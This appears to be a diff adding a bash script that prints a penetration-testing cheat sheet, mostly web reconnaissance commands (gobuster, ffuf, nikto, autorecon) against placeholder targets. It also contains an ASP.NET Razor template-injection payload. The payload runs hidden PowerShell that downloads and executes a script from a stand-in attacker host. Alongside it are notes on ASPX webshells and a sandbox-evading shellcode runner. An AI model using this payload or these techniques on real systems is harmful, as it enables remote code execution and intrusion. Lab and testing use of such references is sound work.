@@ -1,0 +1,50 @@
+#!/bin/bash
+BOLD='\033[1m'
+CYAN='\033[36m'
+GREEN='\033[32m'
+YELLOW='\033[33m'
+BLUE='\033[34m'
+NC='\033[0m'
+
+printf "\n"
+echo -e "${BOLD}${YELLOW}── WEB — RECON & ENUMERATION ────────────────────────${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Gobuster ─────────────────────────────────────────${NC}"
+echo -e "  ${GREEN}gobuster dir -u http://<TARGET> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html${NC}"
+echo -e "  ${GREEN}gobuster dir -u http://<TARGET> -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt${NC}"
+echo -e "  ${GREEN}gobuster vhost -u http://<DOMAIN> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt${NC}"
+echo -e "  ${GREEN}gobuster dns -d <DOMAIN> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── ffuf ─────────────────────────────────────────────${NC}"
+echo -e "  ${GREEN}ffuf -u http://<TARGET>/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt${NC}"
+echo -e "  ${GREEN}ffuf -u http://<TARGET> -H 'Host: FUZZ.<DOMAIN>' -w subdomains.txt -fs <baseline_size>${NC}  # vhost"
+echo -e "  ${GREEN}ffuf -u 'http://<TARGET>/page?FUZZ=test' -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Nikto / whatweb ──────────────────────────────────${NC}"
+echo -e "  ${GREEN}nikto -h http://<TARGET>${NC}"
+echo -e "  ${GREEN}nikto -h http://<TARGET> -p 8080${NC}"
+echo -e "  ${GREEN}whatweb http://<TARGET>${NC}"
+echo -e "  ${GREEN}whatweb -a 3 http://<TARGET>${NC}                       # aggressive"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── SSTI (ASP.NET Razor RCE) ─────────────────────────${NC}"
+echo -e "  Note: Test SSTI: @(3+2)"
+echo -e "  ${GREEN}@{ System.Diagnostics.Process.Start(\"cmd.exe\", \"/c powershell -w hidden -nop -c IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/runner.txt')\"); }${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── ASPX Webshell ────────────────────────────────────${NC}"
+echo -e "  Note: <%@ Page Language=\"C#\" %>   test IIS ASPX support"
+echo -e "  Note: Use shellcode runner with VirtualAllocExNuma sandbox gate"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── AutoRecon ────────────────────────────────────────${NC}"
+echo -e "  ${GREEN}autorecon <TARGET>${NC}"
+echo -e "  ${GREEN}autorecon <TARGET> --output /tmp/autorecon/${NC}"
+echo -e "  ${GREEN}autorecon 192.168.1.0/24${NC}"
+printf "\n"
+
+printf "\n"
+echo -e "${YELLOW}─────────────────────────────────────────────────────${NC}"
